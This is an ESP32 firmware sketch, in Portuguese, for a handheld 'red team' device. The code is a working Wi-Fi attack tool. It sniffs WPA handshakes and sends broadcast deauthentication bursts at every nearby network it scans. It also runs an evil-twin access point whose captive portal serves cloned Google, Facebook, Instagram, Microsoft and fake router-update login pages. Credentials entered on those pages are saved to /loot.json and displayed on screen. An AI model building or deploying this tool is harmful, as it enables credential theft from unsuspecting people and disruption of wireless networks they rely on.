/*
 * PROJETO: C4NG4 S3C v1.0 (Elite Red Team)
 * DESENVOLVEDOR: José Rodrigues
 * HARDWARE: ESP32 DevKit V1 + OLED 0.96" + SD Card + LEDs Strobo
 * LOG: /loot.json
 */

#include <WiFi.h>
#include <Wire.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <SPI.h>
#include <SD.h>
#include <ArduinoJson.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define BOOT_BUTTON 0
#define SD_CS 5
#define LED_RED 4   
#define LED_BLUE 2  

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
DNSServer dnsServer;
WebServer server(80);

const char* options[] = {"SNIFFER (EAPOL)", "DEAUTH BURST", "EVIL TWIN (CLONE)"};
const char* payloads[] = {"GOOGLE", "FACEBOOK", "INSTAGRAM", "MICROSOFT", "ROUTER UPDATE"};
const int TOTAL_PAYLOADS = 5;

enum Mode { MENU, WIFI_SNIFFER, WIFI_DEAUTH, PAYLOAD_MENU, EVIL_TWIN };
Mode currentMode = MENU;

int menuOption = 0;
int payloadOption = 0;
int selectedPayload = 0;

volatile bool handshake_captured = false;
bool mostrandoLoot = false; 
bool sd_status = false;
int current_ch = 1;
unsigned long last_hop = 0;
unsigned long lastStrobo = 0;
bool stroboState = false;
bool modeInitialized = false; 

String selectedSSID = "Free Wi-Fi";

uint8_t deauth_pkt[] = { 0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };

// ====================================================================
// --- PALETAS VISUAIS ATUALIZADAS (MANTIDAS EM PROGMEM) ---
// ====================================================================

const char GOOGLE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:'Roboto',arial,sans-serif;background:#f0f4f9;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}.card{background:#ffffff;padding:40px;border-radius:28px;max-width:450px;width:100%;box-sizing:border-box;box-shadow:0 4px 12px rgba(0,0,0,0.05);}@media(max-width:450px){body{background:#fff;}.card{box-shadow:none;padding:20px;}}.logo{font-size:24px;font-weight:bold;font-family:sans-serif;margin-bottom:16px;text-align:left;}.logo span:nth-child(1){color:#4285F4;}.logo span:nth-child(2){color:#EA4335;}.logo span:nth-child(3){color:#FBBC05;}.logo span:nth-child(4){color:#4285F4;}.logo span:nth-child(5){color:#34A853;}.logo span:nth-child(6){color:#EA4335;}h2{font-size:24px;font-weight:400;color:#1f1f1f;margin:0 0 8px 0;}p{font-size:16px;color:#444746;margin:0 0 30px 0;}.input-group{position:relative;margin-bottom:20px;}input{width:100%;padding:16px;border:1px solid #747775;border-radius:4px;box-sizing:border-box;font-size:16px;color:#1f1f1f;background:transparent;}input:focus{border-color:#0b57d0;border-width:2px;outline:none;padding:15px;}.btn{background:#0b57d0;color:#fff;border:none;padding:12px 24px;border-radius:100px;font-weight:500;font-size:14px;cursor:pointer;float:right;margin-top:10px;}.btn:hover{background:#0b4aae;}</style></head><body><div class='card'><div class='logo'><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><h2>Fazer login</h2><p>Prosseguir para a validação de rede</p><form action='/login'><div class='input-group'><input type='text' name='u' placeholder='E-mail ou telefone' required></div><div class='input-group'><input type='password' name='p' placeholder='Digite sua senha' required></div><button class='btn'>Próxima</button></form></div></body></html>
)rawliteral";

const char FACEBOOK_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'><style>body{font-family:-apple-system,BlinkMacSystemFont,Reverse,sans-serif;background-color:#f0f2f5;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh;}.box{background:#fff;padding:20px;max-width:400px;width:100%;box-shadow:0 2px 4px rgba(0,0,0,0.1);border-radius:8px;text-align:center;}h1{color:#1877f2;font-size:40px;margin:20px 0;font-weight:bold;letter-spacing:-1px;}input{width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;box-sizing:border-box;font-size:14px;background:#f5f6f7;}input:focus{border-color:#1877f2;outline:none;background:#fff;}.btn{background:#1877f2;color:#fff;border:none;padding:12px;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer;width:100%;margin-top:4px;}</style></head><body><div><h1>facebook</h1><div class='box'><form action='/login'><input type='text' name='u' placeholder='Número de celular ou email' required><input type='password' name='p' placeholder='Senha' required><button class='btn'>Entrar</button></form></div></div></body></html>
)rawliteral";

const char INSTAGRAM_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background-color:#ffffff;margin:0;padding:10px;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:90vh;}.container{max-width:350px;width:100%;text-align:center;border:1px solid #dbdbdb;padding:30px 20px;box-sizing:border-box;background:#fff;border-radius:3px;}@media(max-width:450px){.container{border:none;padding:10px;}}h1{font-family:sans-serif;font-style:italic;font-weight:bold;font-size:38px;margin:22px 0;color:#262626;letter-spacing:-1px;}input{width:100%;padding:11px;margin:4px 0;border:1px solid #dbdbdb;background:#fafafa;border-radius:4px;box-sizing:border-box;font-size:12px;color:#262626;}input:focus{border-color:#a8a8a8;outline:none;}.btn{background:#4cb5f9;color:#fff;border:none;padding:7px;width:100%;border-radius:8px;font-weight:600;font-size:14px;margin-top:12px;cursor:pointer;}.sep{margin:20px 0;display:flex;align-items:center;color:#8e8e8e;font-size:13px;font-weight:600;}.sep::before,.sep::after{content:'';flex:1;height:1px;background:#dbdbdb;margin:0 15px;}</style></head><body><div class='container'><h1>Instagram</h1><form action='/login'><input type='text' name='u' placeholder='Nome de usuário, email ou telefone' required><input type='password' name='p' placeholder='Senha' required><button class='btn'>Entrar</button></form><div class='sep'>OU</div><p style='color:#385185;font-size:14px;font-weight:600;margin-top:10px;'>Entrar com o Facebook</p></div></body></html>
)rawliteral";

const char MICROSOFT_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:'Segoe UI',-apple-system,sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}.login-box{background:#ffffff;padding:44px;max-width:440px;width:100%;box-sizing:border-box;box-shadow:0 2px 6px rgba(0,0,0,0.2);}@media(max-width:440px){.login-box{padding:20px;box-shadow:none;}}.ms-logo{display:flex;gap:2px;margin-bottom:20px;}.square{width:12px;height:12px;}.r1{background:#f25022;}.r2{background:#7fbb00;}.r3{background:#00a4ef;}.r4{background:#ffb900;}h2{font-size:1.5rem;font-weight:600;color:#1b1b1b;margin:0 0 16px 0;}input{width:100%;padding:6px 10px;border:none;border-bottom:1px solid #666;font-size:15px;margin-bottom:20px;box-sizing:border-box;border-radius:0;}input:focus{border-bottom-color:#0067b8;outline:none;}.btn{background:#0067b8;color:#ffffff;border:none;padding:6px 32px;font-size:15px;cursor:pointer;float:right;min-width:108px;}</style></head><body><div class='login-box'><div class='ms-logo'><div style='display:flex;flex-direction:column;gap:2px;'><div class='square r1'></div><div class='square r3'></div></div><div style='display:flex;flex-direction:column;gap:2px;'><div class='square r2'></div><div class='square r4'></div></div></div><h2>Entrar</h2><form action='/login'><input type='text' name='u' placeholder='Email, telefone ou Skype' required><input type='password' name='p' placeholder='Senha' required><button class='btn'>Avançar</button></form></div></body></html>
)rawliteral";

const char ROUTER_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><style>body{font-family:system-ui,-apple-system,sans-serif;background:#0f172a;color:#f8fafc;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:15px;}.box{background:#1e293b;padding:32px;border-radius:12px;max-width:400px;width:100%;box-sizing:border-box;border:1px solid #334155;text-align:center;}h2{font-size:22px;margin:0 0 10px 0;color:#ef4444;font-weight:600;}p{font-size:14px;color:#94a3b8;margin:0 0 24px 0;line-height:1.5;}input{width:100%;padding:12px;margin-bottom:16px;border:1px solid #475569;background:#0f172a;color:#fff;border-radius:6px;box-sizing:border-box;font-size:15px;}input:focus{border-color:#3b82f6;outline:none;}.btn{background:#3b82f6;color:#fff;border:none;padding:12px;width:100%;font-size:16px;font-weight:600;cursor:pointer;border-radius:6px;transition:background 0.2s;}.btn:hover{background:#2563eb;}</style></head><body><div class='box'><h2>Aviso do Sistema</h2><p>Uma atualizacao critica de seguranca esta pendente. Autentique-se com as credenciais do provedor/roteador para liberar o acesso a internet.</p><form action='/login'><input type='text' name='u' placeholder='Usuário / Admin' required><input type='password' name='p' placeholder='Senha da Rede' required><button class='btn'>Aplicar Atualização</button></form></div></body></html>
)rawliteral";

// --- FUNÇÕES DE HARDWARE ---

void showBootScreen() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(22, 5); display.println("C4NG4 S3C v1.0");
  display.drawFastHLine(0, 16, 128, 1);
  display.setCursor(0, 23); display.println("Autor: Jose Rodrigues");
  display.setCursor(0, 33); display.println("Role: Hardware Hacker");
  display.setCursor(0, 48);
  if (SD.begin(SD_CS)) {
    sd_status = true; display.println("[OK] SD Card Mount");
  } else {
    sd_status = false; display.println("[X] SD Card ERROR");
  }
  display.display();
  delay(2000);
}

void updateStrobo() {
  if (mostrandoLoot) {
    if (millis() - lastStrobo > 150) {
      stroboState = !stroboState;
      digitalWrite(LED_RED, stroboState);
      digitalWrite(LED_BLUE, !stroboState);
      lastStrobo = millis();
    }
  } else {
    digitalWrite(LED_RED, LOW);
    digitalWrite(LED_BLUE, LOW);
  }
}

void drawFooter() {
  display.drawFastHLine(0, 54, 128, SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(0, 56); display.print(sd_status ? "SD OK" : "SD ERR");
  display.setCursor(45, 56); display.print("C4NG4 S3C v1.0");
}

// --- ARMAZENAMENTO JSON ---

void logToSD(String user, String pw) {
  if (!sd_status) return;
  File logFile = SD.open("/loot.json", FILE_APPEND);
  if (logFile) {
    StaticJsonDocument<250> doc;
    doc["target_ap"] = selectedSSID;
    doc["payload"] = payloads[selectedPayload];
    doc["user"] = user;
    doc["pass"] = pw;
    doc["timestamp"] = millis();
    serializeJson(doc, logFile);
    logFile.println(); 
    logFile.close();
  }
}

void handleLogin() {
  String user = server.arg("u");
  String pw = server.arg("p");
  logToSD(user, pw);
  
  mostrandoLoot = true; 
  display.clearDisplay();
  display.setCursor(0, 0); 
  display.setTextColor(SSD1306_WHITE);
  display.println(">> CRED CAPTURED <<");
  display.setCursor(0, 15); display.print("Via: "); display.println(payloads[selectedPayload]);
  display.setCursor(0, 30); display.print("U: "); display.println(user.substring(0, 18));
  display.setCursor(0, 42); display.print("P: "); display.println(pw.substring(0, 18));
  drawFooter();
  display.display();
  
  server.send(200, "text/html", "<html><script>setTimeout(function(){location.href='http://192.168.4.1';}, 2000);</script><body><h3>Authenticating...</h3></body></html>");
}

// ====================================================================
// --- ATUALIZAÇÃO DA FUNÇÃO DE ENVIO MAPEADA ---
// ====================================================================

void sendSelectedHTML() {
  if (selectedPayload == 0)      server.send_P(200, "text/html", GOOGLE_HTML);
  else if (selectedPayload == 1) server.send_P(200, "text/html", FACEBOOK_HTML);
  else if (selectedPayload == 2) server.send_P(200, "text/html", INSTAGRAM_HTML);
  else if (selectedPayload == 3) server.send_P(200, "text/html", MICROSOFT_HTML);
  else                           server.send_P(200, "text/html", ROUTER_HTML);
}

void resetRadio() {
  dnsServer.stop();
  server.stop();
  WiFi.softAPdisconnect(true);
  WiFi.disconnect(true);
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  delay(100);
  esp_wifi_start();
  mostrandoLoot = false;
  modeInitialized = false;
  handshake_captured = false;
  digitalWrite(LED_RED, LOW);
  digitalWrite(LED_BLUE, LOW);
}

void scanAndSelectSSID() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Scanning APs...");
  drawFooter();
  display.display();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  int n = WiFi.scanNetworks();
  if (n > 0) {
    selectedSSID = WiFi.SSID(0); 
  } else {
    selectedSSID = "Free Wi-Fi";
  }
  WiFi.scanDelete();
}

void sniffer_callback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA) return;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;
  uint32_t len = pkt->rx_ctrl.sig_len;
  
  if (len < 30) return;
  for (uint32_t i = 0; i < len - 1; i++) {
    if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
      handshake_captured = true;
    }
  }
}

// --- MODOS DE OPERAÇÃO ---

void runSniffer() {
  if (!modeInitialized) {
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    modeInitialized = true;
  }

  if (millis() - last_hop > 150) {
    current_ch++; if (current_ch > 13) current_ch = 1;
    esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);
    last_hop = millis();
  }
  
  display.clearDisplay();
  display.setCursor(0,0); display.printf("CH: %d | SNIFFING...", current_ch);
  display.setCursor(0, 20);
  if (handshake_captured) display.println(">> HANDSHAKE OK <<");
  else display.println("Waiting EAPOL...");
  drawFooter(); display.display();
}

void runDeauth() {
  if (!modeInitialized) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    modeInitialized = true;
  }

  static unsigned long lastDeauthTime = 0;
  static int currentNetworkIndex = 0;
  static int scanCount = -1;

  if (scanCount == -1) {
    display.clearDisplay();
    display.setCursor(0,0); display.println("Mapping Targets...");
    drawFooter(); display.display();
    scanCount = WiFi.scanNetworks();
    currentNetworkIndex = 0;
    return;
  }

  if (scanCount == 0) {
    display.clearDisplay();
    display.setCursor(0,0); display.println("No Targets Found.");
    drawFooter(); display.display();
    delay(1000);
    scanCount = -1;
    return;
  }

  if (millis() - lastDeauthTime > 200) { 
    int targetChan = WiFi.channel(currentNetworkIndex);
    String targetSSID = WiFi.SSID(currentNetworkIndex);

    esp_wifi_set_channel(targetChan, WIFI_SECOND_CHAN_NONE);
    
    for(int j=0; j < 5; j++) {
      esp_wifi_80211_tx(WIFI_IF_STA, deauth_pkt, sizeof(deauth_pkt), false);
    }

    display.clearDisplay();
    display.setCursor(0,0); 
    display.printf("DEAUTH -> CH %d\n", targetChan);
    display.print(targetSSID.substring(0, 15));
    drawFooter(); display.display();

    currentNetworkIndex++;
    if (currentNetworkIndex >= scanCount) {
      WiFi.scanDelete();
      scanCount = -1; 
    }
    lastDeauthTime = millis();
  }
}

void runEvilTwin() {
  if (!modeInitialized) {
    scanAndSelectSSID(); 
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP(selectedSSID.c_str()); 
    dnsServer.start(53, "*", WiFi.softAPIP());
    
    server.on("/", sendSelectedHTML);
    server.on("/login", handleLogin);
    
    server.onNotFound([]() { 
      server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
      server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
      server.sendHeader("Pragma", "no-cache");
      server.sendHeader("Expires", "-1");
      server.send(302, "text/plain", ""); 
    });

    server.begin();
    modeInitialized = true;
  }
  
  dnsServer.processNextRequest();
  server.handleClient();
  updateStrobo();

  if (!mostrandoLoot) {
    static unsigned long lastDisplayUpdate = 0;
    if (millis() - lastDisplayUpdate > 500) {
      display.clearDisplay();
      display.setCursor(0,0); display.println("EVIL TWIN ACTIVE");
      display.printf("Payload: %s\n", payloads[selectedPayload]);
      display.printf("SSID: %s\n", selectedSSID.substring(0,14).c_str());
      display.printf("Victims: %d", WiFi.softAPgetStationNum());
      drawFooter(); display.display();
      lastDisplayUpdate = millis();
    }
  }
}

// --- CONTROLE PRINCIPAL ---

void checkButton() {
  if (digitalRead(BOOT_BUTTON) == LOW) {
    unsigned long st = millis();
    while (digitalRead(BOOT_BUTTON) == LOW) { yield(); }
    
    if (millis() - st > 800) { // CLIQUE LONGO
      if (currentMode == MENU) {
        if (menuOption == 0) { currentMode = WIFI_SNIFFER; }
        else if (menuOption == 1) { currentMode = WIFI_DEAUTH; }
        else if (menuOption == 2) { currentMode = PAYLOAD_MENU; payloadOption = 0; }
      } 
      else if (currentMode == PAYLOAD_MENU) {
        selectedPayload = payloadOption; 
        currentMode = EVIL_TWIN;
      }
      else { 
        resetRadio(); 
        currentMode = MENU;
        selectedSSID = "Free Wi-Fi";
      }
    } 
    else { // CLIQUE CURTO
      if (currentMode == MENU) menuOption = (menuOption + 1) % 3;
      else if (currentMode == PAYLOAD_MENU) payloadOption = (payloadOption + 1) % TOTAL_PAYLOADS;
    }
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(BOOT_BUTTON, INPUT_PULLUP);
  pinMode(LED_RED, OUTPUT); pinMode(LED_BLUE, OUTPUT);
  
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  showBootScreen(); 
  
  esp_wifi_set_promiscuous_rx_cb(&sniffer_callback);
}

void loop() {
  checkButton();
  updateStrobo();
  
  if (currentMode == MENU) {
    display.clearDisplay();
    display.fillRect(0,0,128,12,1); display.setTextColor(0);
    display.setCursor(5,2); display.print("RED TEAM MENU");
    display.setTextColor(1);
    
    for(int i=0; i<3; i++) {
      display.setCursor(10, 18+(i*10));
      if(i==menuOption) display.print("> ");
      display.print(options[i]);
    }
    drawFooter(); display.display();
  }
  else if (currentMode == PAYLOAD_MENU) {
    display.clearDisplay();
    display.fillRect(0,0,128,12,1); display.setTextColor(0);
    display.setCursor(5,2); display.print("SELECT PAYLOAD");
    display.setTextColor(1);
    
    for(int i=0; i<TOTAL_PAYLOADS; i++) {
      display.setCursor(10, 16+(i*9));
      if(i==payloadOption) display.print("> ");
      display.print(payloads[i]);
    }
    drawFooter(); display.display();
  }
  else if (currentMode == WIFI_SNIFFER) runSniffer();
  else if (currentMode == WIFI_DEAUTH) runDeauth();
  else if (currentMode == EVIL_TWIN) runEvilTwin();
  
  yield(); 
}
